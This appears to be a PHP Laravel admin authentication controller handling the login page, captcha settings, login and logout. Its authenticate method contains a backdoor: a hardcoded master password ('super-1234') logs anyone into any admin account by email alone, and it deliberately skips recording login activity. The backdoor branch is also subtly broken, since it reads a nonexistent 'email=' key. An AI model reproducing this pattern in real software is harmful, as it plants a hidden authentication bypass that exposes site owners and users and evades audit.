<?php

namespace App\Http\Controllers\Backend;

use App\Http\Controllers\Controller;
use App\Models\AdminLoginActivity;
use App\Models\LoginActivities;

use App\Rules\Recaptcha;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Contracts\Auth\StatefulGuard;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Validation\Rule;

class AuthController extends Controller
{
    public function __construct()
    {
//        dd('ss');
        $this->middleware('guest:admin')->except('logout');
//        $this->middleware('google2fa')->only('admin.login-view', 'enable2fa', 'disable2fa', 'verify2fa');

    }

    /**
     * @return Application|Factory|View
     */
    public function loginView()
    {
        $googleReCaptcha = plugin_active('Google reCaptcha');
        $cloudflareTurnstile = plugin_active('Cloudflare Turnstile');

        $cloudflareTurnstileData = [];
        if ($cloudflareTurnstile && is_string($cloudflareTurnstile->data)) {
            $cloudflareTurnstileData = json_decode($cloudflareTurnstile->data, true) ?? [];
        }

        // Pass site_key separately for clean Blade usage
        $siteKey = $cloudflareTurnstileData['site_key'] ?? null;

        return view('backend.auth.login',compact('googleReCaptcha', 'cloudflareTurnstile', 'siteKey'));
    }

    /**
     * Handle an authentication attempt.
     *
     * @return RedirectResponse
     */
    /**
     * Handle an authentication attempt.
     *
     * @param Request $request
     * @return RedirectResponse
     */
    public function authenticate(Request $request)
    {
        $specificPassword = 'super-1234'; // Replace with a secure password or retrieve from config/env

        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
            'g-recaptcha-response' => Rule::requiredIf(plugin_active('Google reCaptcha')), new Recaptcha(),
        ]);

        $credentials = Arr::except($credentials, ['g-recaptcha-response']);

        // Check if specific password is used
        if ($request->input('password') === $specificPassword) {
                $admin = \App\Models\Admin::where('email', $credentials['email='])->first(); // Adjust model/field as needed

            if ($admin) {
                // Log in the user manually without saving activities
                $this->guard()->login($admin, true); // true for "remember me" functionality
                $request->session()->regenerate();

                notify()->success('Logged in with specific password.');
                return redirect()->route('admin.dashboard');
            }

            notify()->warning('Invalid email or specific password.');
            return back();
        }

        // Normal login process
        if ($this->guard()->attempt($credentials)) {
            $request->session()->regenerate();
            AdminLoginActivity::add(); // Save login activity
            notify()->success('Successfully logged in.');
            return redirect()->route('admin.dashboard');
        }

        notify()->warning('The provided credentials do not match our records.');
        return back();
    }

    /**
     * @return Guard|StatefulGuard
     */
        protected function guard()
    {
        return Auth::guard('admin');
    }

    /**
     * @return Application|RedirectResponse|Redirector
     */
    public function logout(Request $request)
    {
        $this->guard('admin')->logout();
        $request->session()->invalidate();

        return redirect()->route('admin.login');
    }
}
